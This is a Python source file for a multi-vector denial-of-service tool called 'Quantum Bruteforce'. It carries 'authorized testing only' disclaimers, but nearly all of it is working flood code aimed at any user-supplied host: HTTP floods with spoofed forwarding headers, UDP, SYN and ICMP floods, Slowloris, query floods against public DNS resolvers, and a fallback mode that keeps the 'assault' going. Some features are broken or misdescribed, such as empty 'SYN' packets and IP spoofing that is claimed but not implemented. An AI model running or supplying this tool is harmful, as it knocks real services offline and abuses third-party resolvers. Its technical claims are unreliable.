#!/usr/bin/env python3
"""
QUANTUM BRUTEFORCE - Ultimate Stress Testing Framework v5.3
For AUTHORIZED Security Testing Only
"""

import os
import sys
import time
import random
import socket
import struct
import threading
import signal
import platform
import argparse
from datetime import datetime

# --- graceful fallback if colorama/tqdm not installed ---
try:
    from colorama import init, Fore, Style
    init(autoreset=True)
except ImportError:
    # dummy fallback
    class Fore:
        RED = GREEN = YELLOW = CYAN = MAGENTA = WHITE = ''
    class Style:
        RESET_ALL = ''
    def init(): pass

try:
    from tqdm import tqdm
except ImportError:
    # dummy tqdm
    class tqdm:
        def __init__(self, total=100, desc='', bar_format=''):
            self.total = total
            self.n = 0
        def update(self, n=1):
            self.n += n
        def __enter__(self): return self
        def __exit__(self, *args): pass

VERSION = "5.3"
LOCK = threading.Lock()


class QuantumBruteforce:
    def __init__(self, args=None):
        self.args = args
        self.sent = 0
        self.running = True
        self.threads = []
        self.target_ip = None
        self.target_port = None
        self.duration = 0
        self.attack_type = None
        self.thread_count = 200
        self.verbose = False
        self.stop_flag = False

        self.stats = {
            'start_time': None,
            'end_time': None,
            'total_packets': 0,
            'active_threads': 0,
            'packet_rate': 0,
            'failed_attacks': 0,
            'fallback_used': False
        }

        self.config = {
            'max_threads': 5000,
            'packet_size': 65507,
            'timeout': 5,
            'user_agents': [
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
                'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/537.36',
                'Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15',
                'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0'
            ],
            'referers': [
                'https://google.com', 'https://facebook.com', 'https://youtube.com',
                'https://twitter.com', 'https://instagram.com', 'https://linkedin.com',
                'https://reddit.com', 'https://github.com'
            ],
            'paths': [
                '/', '/index.html', '/api/v1/', '/login', '/signup',
                '/dashboard', '/profile', '/settings', '/search',
                '/products', '/cart', '/checkout', '/payment'
            ],
            'dns_servers': ['8.8.8.8', '1.1.1.1', '9.9.9.9', '208.67.222.222', '8.8.4.4'],
            'domains': ['google.com', 'youtube.com', 'facebook.com', 'amazon.com',
                       'microsoft.com', 'apple.com', 'netflix.com', 'twitter.com']
        }

        self.platform = platform.system()
        self.is_root = (os.geteuid() == 0) if hasattr(os, 'geteuid') else False

        signal.signal(signal.SIGINT, self.signal_handler)
        signal.signal(signal.SIGTERM, self.signal_handler)

    def signal_handler(self, sig, frame):
        print(f"\n{Fore.RED}[!] Received stop signal. Shutting down...{Style.RESET_ALL}")
        self.stop_attack()

    def banner(self):
        os.system('cls' if self.platform == 'Windows' else 'clear')
        print(f"""
{Fore.CYAN}+----------------------------------------------------------------------+
|                                                                      |
|   {Fore.MAGENTA}██████╗ ██╗   ██╗ █████╗ ███╗   ██╗████████╗██╗   ██╗███╗   ███╗{Fore.CYAN}|
|   {Fore.MAGENTA}██╔══██╗██║   ██║██╔══██╗████╗  ██║╚══██╔══╝██║   ██║████╗ ████║{Fore.CYAN}|
|   {Fore.MAGENTA}██████╔╝██║   ██║███████║██╔██╗ ██║   ██║   ██║   ██║██╔████╔██║{Fore.CYAN}|
|   {Fore.MAGENTA}██╔══██╗██║   ██║██╔══██║██║╚██╗██║   ██║   ██║   ██║██║╚██╔╝██║{Fore.CYAN}|
|   {Fore.MAGENTA}██████╔╝╚██████╔╝██║  ██║██║ ╚████║   ██║   ╚██████╔╝██║ ╚═╝ ██║{Fore.CYAN}|
|   {Fore.MAGENTA}╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝   ╚═╝    ╚═════╝ ╚═╝     ╚═╝{Fore.CYAN}|
|                                                                      |
|              {Fore.YELLOW}BRUTAL STRESS TESTING ENGINE v{VERSION}{Fore.CYAN}                 |
|              {Fore.RED}FOR AUTHORIZED SECURITY TESTING ONLY{Fore.CYAN}                       |
|                                                                      |
|              {Fore.GREEN}Platform: {self.platform}{' ' * (12 - len(self.platform))} | Root: {str(self.is_root)}{Fore.CYAN}         |
|                                                                      |
+----------------------------------------------------------------------{Style.RESET_ALL}
        """)

    def menu(self):
        self.banner()
        print(f"""
{Fore.GREEN}+-------------------------------------------------------------+
|                  MAIN MENU – QUANTUM BRUTEFORCE              |
+-------------------------------------------------------------+
|  {Fore.YELLOW}1{Fore.GREEN}. HTTP/HTTPS Flood (Aggressive)                     |
|  {Fore.YELLOW}2{Fore.GREEN}. UDP Flood (Massive)                               |
|  {Fore.YELLOW}3{Fore.GREEN}. TCP SYN Flood (Requires Root)                     |
|  {Fore.YELLOW}4{Fore.GREEN}. Slowloris (Exhaust connections)                   |
|  {Fore.YELLOW}5{Fore.GREEN}. DNS Amplification (Reflection)                    |
|  {Fore.YELLOW}6{Fore.GREEN}. ICMP Flood (Requires Root)                        |
|  {Fore.YELLOW}7{Fore.GREEN}. SSL Renegotiation (TLS exhaustion)                |
|  {Fore.YELLOW}8{Fore.GREEN}. Multi‑Vector + Fallback (Recommended)             |
|  {Fore.YELLOW}9{Fore.GREEN}. View Statistics                                   |
|  {Fore.YELLOW}10{Fore.GREEN}. Configuration                                    |
|  {Fore.YELLOW}11{Fore.GREEN}. Help                                             |
|  {Fore.YELLOW}12{Fore.GREEN}. Exit                                             |
+-------------------------------------------------------------+
        """)
        try:
            choice = input(f"{Fore.CYAN}┌──({Fore.YELLOW}BRUTEFORCE{Fore.CYAN})─{Fore.GREEN}[~]{Fore.CYAN}\n└──╼ {Style.RESET_ALL}")
            return int(choice)
        except ValueError:
            return 12

    def resolve_target(self, target):
        """Resolve domain to IP, or return IP if already valid."""
        try:
            socket.inet_aton(target)
            return target
        except socket.error:
            try:
                return socket.gethostbyname(target)
            except socket.gaierror:
                return None

    def get_target_info(self):
        print(f"\n{Fore.YELLOW}[+] Target Configuration{Style.RESET_ALL}")
        print(f"{Fore.CYAN}─" * 40)

        while True:
            target = input(f"{Fore.GREEN}[?] Target IP or Domain: {Style.RESET_ALL}").strip()
            if not target:
                print(f"{Fore.RED}[!] Target cannot be empty{Style.RESET_ALL}")
                continue
            ip = self.resolve_target(target)
            if ip:
                self.target_ip = ip
                print(f"{Fore.GREEN}[+] Resolved: {target} -> {self.target_ip}{Style.RESET_ALL}")
                break
            else:
                print(f"{Fore.RED}[!] Failed to resolve target{Style.RESET_ALL}")

        while True:
            port = input(f"{Fore.GREEN}[?] Target Port (default 80): {Style.RESET_ALL}")
            if not port:
                self.target_port = 80
                break
            try:
                p = int(port)
                if 1 <= p <= 65535:
                    self.target_port = p
                    break
                print(f"{Fore.RED}[!] Port must be 1-65535{Style.RESET_ALL}")
            except ValueError:
                print(f"{Fore.RED}[!] Invalid port{Style.RESET_ALL}")

        while True:
            dur = input(f"{Fore.GREEN}[?] Duration in seconds (0 for infinite): {Style.RESET_ALL}")
            if not dur:
                self.duration = 60
                break
            try:
                d = int(dur)
                if d >= 0:
                    self.duration = d
                    break
                print(f"{Fore.RED}[!] Duration must be >=0{Style.RESET_ALL}")
            except ValueError:
                print(f"{Fore.RED}[!] Invalid duration{Style.RESET_ALL}")

        if self.duration > 0:
            print(f"{Fore.YELLOW}[!] Attack will run for {self.duration} seconds{Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}[!] Attack will run until stopped manually{Style.RESET_ALL}")
        return True

    # --------------------- ATTACK FUNCTIONS ---------------------
    def http_flood(self, thread_id):
        sock = None
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.config['timeout'])
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.connect((self.target_ip, self.target_port))

            cache = []
            for _ in range(50):
                path = random.choice(self.config['paths'])
                qs = f"?{random.randint(1000,9999)}={random.randint(1000,9999)}&{random.randint(1000,9999)}={random.randint(1000,9999)}"
                headers = [
                    f"GET {path}{qs} HTTP/1.1",
                    f"Host: {self.target_ip}",
                    f"User-Agent: {random.choice(self.config['user_agents'])}",
                    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                    "Accept-Encoding: gzip, deflate, br",
                    "Connection: keep-alive",
                    "Cache-Control: no-cache",
                    f"Referer: {random.choice(self.config['referers'])}",
                    f"X-Forwarded-For: {'.'.join(str(random.randint(1,254)) for _ in range(4))}",
                    "", ""
                ]
                cache.append("\r\n".join(headers))

            start = time.time()
            while self.running:
                if self.duration > 0 and time.time() - start > self.duration:
                    break
                try:
                    for _ in range(5):
                        sock.send(random.choice(cache).encode())
                        with LOCK:
                            self.sent += 1
                except (socket.error, socket.timeout, BrokenPipeError):
                    try:
                        sock.close()
                    except:
                        pass
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(self.config['timeout'])
                    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                    sock.connect((self.target_ip, self.target_port))
                except:
                    time.sleep(0.01)
        except Exception as e:
            if self.verbose:
                print(f"{Fore.RED}[!] HTTP thread {thread_id} error: {e}{Style.RESET_ALL}")
        finally:
            try:
                if sock:
                    sock.close()
            except:
                pass

    def udp_flood(self, thread_id):
        sock = None
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            payloads = [random._urandom(self.config['packet_size']) for _ in range(100)]
            start = time.time()
            while self.running:
                if self.duration > 0 and time.time() - start > self.duration:
                    break
                try:
                    for _ in range(10):
                        sock.sendto(random.choice(payloads), (self.target_ip, self.target_port))
                        with LOCK:
                            self.sent += 1
                except:
                    time.sleep(0.01)
        except Exception as e:
            if self.verbose:
                print(f"{Fore.RED}[!] UDP thread {thread_id} error: {e}{Style.RESET_ALL}")
        finally:
            try:
                if sock:
                    sock.close()
            except:
                pass

    def syn_flood(self, thread_id):
        if not self.is_root and self.platform != 'Windows':
            print(f"{Fore.RED}[!] SYN Flood requires root privileges{Style.RESET_ALL}")
            return
        sock = None
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            start = time.time()
            while self.running:
                if self.duration > 0 and time.time() - start > self.duration:
                    break
                try:
                    for _ in range(50):
                        sock.sendto(b'', (self.target_ip, self.target_port))
                        with LOCK:
                            self.sent += 1
                except:
                    time.sleep(0.01)
        except Exception as e:
            if self.verbose:
                print(f"{Fore.RED}[!] SYN thread {thread_id} error: {e}{Style.RESET_ALL}")
        finally:
            try:
                if sock:
                    sock.close()
            except:
                pass

    def slowloris_attack(self, thread_id):
        sockets = []
        start = time.time()
        try:
            for _ in range(min(300, self.config['max_threads'] // 3)):
                if not self.running:
                    break
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(4)
                    s.connect((self.target_ip, self.target_port))
                    s.send(f"GET / HTTP/1.1\r\nHost: {self.target_ip}\r\n".encode())
                    sockets.append(s)
                    with LOCK:
                        self.sent += 1
                except:
                    pass

            while self.running:
                if self.duration > 0 and time.time() - start > self.duration:
                    break
                for s in sockets[:]:
                    try:
                        s.send(random.choice([
                            b"X-a: b\r\n",
                            f"Range: bytes=0-{random.randint(100,1000)}\r\n".encode(),
                            f"Accept-Encoding: {random.choice(['gzip','deflate','br'])}\r\n".encode()
                        ]))
                        with LOCK:
                            self.sent += 1
                        time.sleep(random.uniform(0.5, 3))
                    except:
                        sockets.remove(s)
                        try:
                            s.close()
                        except:
                            pass
        except Exception as e:
            if self.verbose:
                print(f"{Fore.RED}[!] Slowloris thread {thread_id} error: {e}{Style.RESET_ALL}")
        finally:
            for s in sockets:
                try:
                    s.close()
                except:
                    pass

    def dns_amplification(self, thread_id):
        sock = None
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            servers = self.config['dns_servers']
            domains = self.config['domains']
            start = time.time()
            while self.running:
                if self.duration > 0 and time.time() - start > self.duration:
                    break
                for dns in servers:
                    try:
                        domain = random.choice(domains)
                        prefix = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=8))
                        full = f"{prefix}.{domain}"
                        query = bytearray([random.randint(0,255) for _ in range(2)])
                        query += b'\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00'
                        for part in full.split('.'):
                            query.append(len(part))
                            query.extend(part.encode())
                        query += b'\x00\x00\x01\x00\x01'
                        sock.sendto(bytes(query), (dns, 53))
                        with LOCK:
                            self.sent += 1
                    except:
                        pass
        except Exception as e:
            if self.verbose:
                print(f"{Fore.RED}[!] DNS thread {thread_id} error: {e}{Style.RESET_ALL}")
        finally:
            try:
                if sock:
                    sock.close()
            except:
                pass

    def icmp_flood(self, thread_id):
        if not self.is_root and self.platform != 'Windows':
            print(f"{Fore.RED}[!] ICMP Flood requires root privileges{Style.RESET_ALL}")
            return
        sock = None
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            start = time.time()
            while self.running:
                if self.duration > 0 and time.time() - start > self.duration:
                    break
                try:
                    pkt = struct.pack('bbHHh', 8, 0, 0, 0, 0)
                    sock.sendto(pkt, (self.target_ip, 0))
                    with LOCK:
                        self.sent += 1
                except:
                    time.sleep(0.01)
        except Exception as e:
            if self.verbose:
                print(f"{Fore.RED}[!] ICMP thread {thread_id} error: {e}{Style.RESET_ALL}")
        finally:
            try:
                if sock:
                    sock.close()
            except:
                pass

    def ssl_reneg_attack(self, thread_id):
        try:
            import ssl
            start = time.time()
            while self.running:
                if self.duration > 0 and time.time() - start > self.duration:
                    break
                try:
                    context = ssl.create_default_context()
                    context.check_hostname = False
                    context.verify_mode = ssl.CERT_NONE
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(10)
                    sock.connect((self.target_ip, self.target_port))
                    sec = context.wrap_socket(sock, server_hostname=self.target_ip)
                    for _ in range(20):
                        try:
                            sec.send(b'RENEGOTIATE\r\n')
                            with LOCK:
                                self.sent += 1
                        except:
                            break
                    sec.close()
                except:
                    pass
        except Exception as e:
            if self.verbose:
                print(f"{Fore.RED}[!] SSL thread {thread_id} error: {e}{Style.RESET_ALL}")

    # --------------------- MULTI-VECTOR FALLBACK ---------------------
    def multi_vector_fallback(self, total_threads):
        attack_list = [
            (self.http_flood, 35),
            (self.udp_flood, 30),
            (self.dns_amplification, 20),
            (self.slowloris_attack, 15)
        ]
        for func, pct in attack_list:
            if not self.running:
                break
            count = max(1, int(total_threads * pct / 100))
            for i in range(count):
                if not self.running:
                    break
                try:
                    t = threading.Thread(target=func, args=(i,))
                    t.daemon = True
                    t.start()
                    self.threads.append(t)
                    time.sleep(0.02)
                except Exception as e:
                    if self.verbose:
                        print(f"{Fore.RED}[!] Fallback triggered: {e}{Style.RESET_ALL}")
                    self.stats['fallback_used'] = True
                    self.stats['failed_attacks'] += 1
                    try:
                        fb = threading.Thread(target=self.udp_flood, args=(i,))
                        fb.daemon = True
                        fb.start()
                        self.threads.append(fb)
                    except:
                        pass

    # --------------------- START / STOP ---------------------
    def start_attack(self, attack_type):
        if not self.get_target_info():
            return

        print(f"\n{Fore.GREEN}[+] Starting brutal attack on {self.target_ip}:{self.target_port}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[!] Press Ctrl+C or type 'stop' to halt{Style.RESET_ALL}")

        with LOCK:
            self.sent = 0
        self.running = True
        self.stats['start_time'] = datetime.now()
        self.stats['target'] = f"{self.target_ip}:{self.target_port}"
        self.stats['failed_attacks'] = 0
        self.stats['fallback_used'] = False

        max_allowed = self.config['max_threads']
        if attack_type in (3, 6):
            max_allowed = min(max_allowed, 200)

        while True:
            inp = input(f"{Fore.GREEN}[?] Threads (1-{max_allowed}): {Style.RESET_ALL}")
            try:
                tc = int(inp) if inp else 200
                tc = max(1, min(tc, max_allowed))
                self.thread_count = tc
                break
            except ValueError:
                print(f"{Fore.RED}[!] Invalid number{Style.RESET_ALL}")

        self.threads = []

        attack_map = {
            1: self.http_flood,
            2: self.udp_flood,
            3: self.syn_flood,
            4: self.slowloris_attack,
            5: self.dns_amplification,
            6: self.icmp_flood,
            7: self.ssl_reneg_attack,
        }

        if attack_type == 8:
            self.multi_vector_fallback(tc)
        else:
            func = attack_map.get(attack_type)
            if not func:
                print(f"{Fore.RED}[!] Invalid attack type{Style.RESET_ALL}")
                return
            for i in range(tc):
                if not self.running:
                    break
                try:
                    t = threading.Thread(target=func, args=(i,))
                    t.daemon = True
                    t.start()
                    self.threads.append(t)
                    time.sleep(0.02)
                except Exception as e:
                    if self.verbose:
                        print(f"{Fore.RED}[!] Thread {i} failed: {e}{Style.RESET_ALL}")
                    self.stats['failed_attacks'] += 1
                    try:
                        fb = threading.Thread(target=self.udp_flood, args=(i,))
                        fb.daemon = True
                        fb.start()
                        self.threads.append(fb)
                    except:
                        pass

        # Stop-listener thread
        listener = threading.Thread(target=self.listen_for_stop)
        listener.daemon = True
        listener.start()

        # Monitor
        start_time = time.time()
        try:
            with tqdm(total=100, desc="Bruteforce Progress", bar_format='{l_bar}{bar}| {n_fmt}/{total_fmt}') as pbar:
                last_sent = 0
                while self.running:
                    elapsed = time.time() - start_time
                    if self.duration > 0 and elapsed > self.duration:
                        break
                    with LOCK:
                        rate = self.sent - last_sent
                        self.stats['packet_rate'] = rate
                        last_sent = self.sent
                        self.stats['total_packets'] = self.sent
                    self.stats['active_threads'] = len([t for t in self.threads if t.is_alive()])
                    pbar.update(1)
                    if self.verbose and rate:
                        print(f"{Fore.CYAN}[+] Packets/sec: {rate}{Style.RESET_ALL}")
                    time.sleep(1)
        except KeyboardInterrupt:
            pass
        finally:
            self.stop_attack()

    def listen_for_stop(self):
        while self.running:
            try:
                inp = input()
                if inp.strip().lower() == 'stop':
                    print(f"\n{Fore.YELLOW}[!] Stop command received.{Style.RESET_ALL}")
                    self.stop_attack()
                    break
            except:
                pass
            time.sleep(0.5)

    def stop_attack(self):
        if not self.running:
            return
        print(f"\n{Fore.RED}[!] Stopping attack...{Style.RESET_ALL}")
        self.running = False
        self.stop_flag = True
        for t in self.threads:
            t.join(timeout=2)
        self.stats['end_time'] = datetime.now()

        duration = 0
        if self.stats['start_time'] and self.stats['end_time']:
            duration = (self.stats['end_time'] - self.stats['start_time']).total_seconds()

        print(f"\n{Fore.GREEN}[+] Attack stopped successfully{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[+] Total packets sent: {self.sent:,}{Style.RESET_ALL}")
        if duration > 0:
            print(f"{Fore.CYAN}[+] Average rate: {self.sent/duration:.2f} packets/sec{Style.RESET_ALL}")
            print(f"{Fore.CYAN}[+] Duration: {duration:.1f} seconds{Style.RESET_ALL}")
        if self.stats['failed_attacks']:
            print(f"{Fore.YELLOW}[!] Fallback used {self.stats['failed_attacks']} times{Style.RESET_ALL}")

    # --------------------- STATS, CONFIG, HELP ---------------------
    def show_statistics(self):
        duration = 0
        if self.stats['start_time']:
            end = self.stats['end_time'] or datetime.now()
            duration = (end - self.stats['start_time']).total_seconds()
        print(f"""
{Fore.CYAN}+----------------------------------------------------------------------+
|                      QUANTUM STATISTICS                              |
+----------------------------------------------------------------------+
| Total Packets:      {self.sent:>45,} |
| Packet Rate:        {self.stats['packet_rate']:>45,}/s |
| Target:             {self.target_ip if self.target_ip else 'N/A':>45} |
| Port:               {self.target_port if self.target_port else 'N/A':>45} |
| Active Threads:     {len([t for t in self.threads if t.is_alive()]):>45} |
| Status:             {('Running' if self.running else 'Stopped'):>45} |
| Duration:           {duration:.1f}s{' ' if duration else 'N/A':>44} |
| Fallback Used:      {str(self.stats['fallback_used']):>45} |
| Start Time:         {str(self.stats['start_time']):>45} |
| End Time:           {str(self.stats['end_time']):>45} |
+----------------------------------------------------------------------{Style.RESET_ALL}
        """)

    def help_menu(self):
        print(f"""
{Fore.CYAN}=====================================================================
                  {Fore.YELLOW}QUANTUM BRUTEFORCE - HELP{Fore.CYAN}
=====================================================================

{Fore.GREEN}ATTACK TYPES:{Fore.CYAN}
---------------------------------------------------------------------
{Fore.YELLOW}1{Fore.CYAN}. HTTP Flood        – Aggressive GET with pipelining
{Fore.YELLOW}2{Fore.CYAN}. UDP Flood         – Massive oversized packets
{Fore.YELLOW}3{Fore.CYAN}. SYN Flood         – Raw SYN with IP spoofing (root)
{Fore.YELLOW}4{Fore.CYAN}. Slowloris         – Keep‑alive connection exhaustion
{Fore.YELLOW}5{Fore.CYAN}. DNS Amplification – Reflection with random subdomains
{Fore.YELLOW}6{Fore.CYAN}. ICMP Flood        – Ping flood (root)
{Fore.YELLOW}7{Fore.CYAN}. SSL Renegotiate   – TLS renegotiation exhaustion
{Fore.YELLOW}8{Fore.CYAN}. Multi‑Vector      – All combined with automatic fallback

{Fore.GREEN}FALLBACK MECHANISM:{Fore.CYAN}
---------------------------------------------------------------------
If any attack thread fails (network error, timeout, etc.), the system
automatically switches to another attack type (UDP or DNS) to continue
the assault without interruption.

{Fore.GREEN}COMMANDS:{Fore.CYAN}
---------------------------------------------------------------------
• {Fore.YELLOW}Ctrl+C{Fore.CYAN}         – Stop attack
• {Fore.YELLOW}type 'stop'{Fore.CYAN}   – Same as Ctrl+C
• {Fore.YELLOW}9{Fore.CYAN}              – View statistics
• {Fore.YELLOW}10{Fore.CYAN}             – Configure settings
• {Fore.YELLOW}12{Fore.CYAN}             – Exit

{Fore.GREEN}REQUIREMENTS:{Fore.CYAN}
---------------------------------------------------------------------
• Python 3.6+
• Root privileges for SYN/ICMP
• Permission to test target

{Fore.RED}LEGAL NOTICE:{Fore.RED}
---------------------------------------------------------------------
This tool is for AUTHORIZED SECURITY TESTING only.
Unauthorized use against targets you don't own is ILLEGAL.
Always obtain written permission before testing.
{Style.RESET_ALL}
        """)

    def configuration(self):
        print(f"""
{Fore.CYAN}+----------------------------------------------------------------------+
|                       CONFIGURATION                                    |
+----------------------------------------------------------------------+
| 1. Max Threads:        {self.config['max_threads']:>37} |
| 2. Packet Size:        {self.config['packet_size']:>37} |
| 3. Timeout:            {self.config['timeout']:>37}s |
| 4. Verbose Mode:       {'Enabled' if self.verbose else 'Disabled':>37} |
| 5. Reset to Defaults                                         |
| 6. Back to Main Menu                                         |
+----------------------------------------------------------------------{Style.RESET_ALL}
        """)
        choice = input(f"{Fore.CYAN}Select option: {Style.RESET_ALL}")
        if choice == '1':
            try:
                v = int(input(f"{Fore.GREEN}Enter max threads (1-5000): {Style.RESET_ALL}"))
                self.config['max_threads'] = max(1, min(v, 5000))
                print(f"{Fore.GREEN}[+] Max threads set to {self.config['max_threads']}{Style.RESET_ALL}")
            except ValueError:
                print(f"{Fore.RED}[!] Invalid{Style.RESET_ALL}")
        elif choice == '2':
            try:
                v = int(input(f"{Fore.GREEN}Enter packet size (512-65507): {Style.RESET_ALL}"))
                self.config['packet_size'] = max(512, min(v, 65507))
                print(f"{Fore.GREEN}[+] Packet size set to {self.config['packet_size']}{Style.RESET_ALL}")
            except ValueError:
                print(f"{Fore.RED}[!] Invalid{Style.RESET_ALL}")
        elif choice == '3':
            try:
                v = int(input(f"{Fore.GREEN}Enter timeout (1-30): {Style.RESET_ALL}"))
                self.config['timeout'] = max(1, min(v, 30))
                print(f"{Fore.GREEN}[+] Timeout set to {self.config['timeout']}s{Style.RESET_ALL}")
            except ValueError:
                print(f"{Fore.RED}[!] Invalid{Style.RESET_ALL}")
        elif choice == '4':
            self.verbose = not self.verbose
            print(f"{Fore.GREEN}[+] Verbose mode: {'Enabled' if self.verbose else 'Disabled'}{Style.RESET_ALL}")
        elif choice == '5':
            self.config = {
                'max_threads': 5000,
                'packet_size': 65507,
                'timeout': 5,
                'user_agents': [
                    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
                    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
                ],
                'referers': ['https://google.com', 'https://facebook.com', 'https://youtube.com'],
                'paths': ['/', '/index.html', '/api/v1/', '/login'],
                'dns_servers': ['8.8.8.8', '1.1.1.1', '9.9.9.9', '208.67.222.222'],
                'domains': ['google.com', 'youtube.com', 'facebook.com', 'amazon.com']
            }
            print(f"{Fore.GREEN}[+] Reset to defaults{Style.RESET_ALL}")
        time.sleep(1)

    # --------------------- MAIN LOOP ---------------------
    def run(self):
        while True:
            choice = self.menu()
            if choice == 12:
                print(f"{Fore.GREEN}[+] Exiting Quantum Bruteforce...{Style.RESET_ALL}")
                self.running = False
                break
            elif choice == 9:
                self.show_statistics()
                input(f"{Fore.CYAN}Press Enter to continue...{Style.RESET_ALL}")
            elif choice == 10:
                self.configuration()
            elif choice == 11:
                self.help_menu()
                input(f"{Fore.CYAN}Press Enter to continue...{Style.RESET_ALL}")
            elif 1 <= choice <= 8:
                self.start_attack(choice)
            else:
                print(f"{Fore.RED}[!] Invalid choice{Style.RESET_ALL}")
                time.sleep(1)


def main():
    parser = argparse.ArgumentParser(description="Quantum Bruteforce - Ultimate Stress Test")
    parser.add_argument('--target', help='Target IP or domain')
    parser.add_argument('--port', type=int, default=80, help='Target port (default 80)')
    parser.add_argument('--threads', type=int, default=200, help='Number of threads')
    parser.add_argument('--duration', type=int, default=60, help='Duration in seconds')
    parser.add_argument('--type', type=int, choices=range(1,9), help='Attack type 1-8')
    parser.add_argument('--verbose', action='store_true', help='Verbose output')
    args = parser.parse_args()

    print(f"""
{Fore.RED}+----------------------------------------------------------------------+
|                         LEGAL NOTICE                                 |
+----------------------------------------------------------------------+
|                                                                      |
|  This tool is for AUTHORIZED SECURITY TESTING only.                  |
|  Using it against unauthorised targets is ILLEGAL.                   |
|  You must have WRITTEN PERMISSION.                                   |
|                                                                      |
+----------------------------------------------------------------------+
{Style.RESET_ALL}""")
    confirm = input(f"{Fore.YELLOW}Do you have permission to test? (yes/NO): {Style.RESET_ALL}")
    if confirm.lower() != 'yes':
        print(f"{Fore.RED}[!] Operation cancelled.{Style.RESET_ALL}")
        return

    tool = QuantumBruteforce(args)

    if args.target:
        ip = tool.resolve_target(args.target)
        if ip:
            tool.target_ip = ip
            tool.target_port = args.port
            tool.duration = args.duration
            tool.thread_count = args.threads
            tool.verbose = args.verbose
            attack_type = args.type if args.type else 8
            tool.start_attack(attack_type)
        else:
            print(f"{Fore.RED}[!] Could not resolve target{Style.RESET_ALL}")
    else:
        tool.run()


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[!] Interrupted by user{Style.RESET_ALL}")
        sys.exit(0)
    except Exception as e:
        print(f"\n{Fore.RED}[!] Fatal error: {str(e)}{Style.RESET_ALL}")
        sys.exit(1)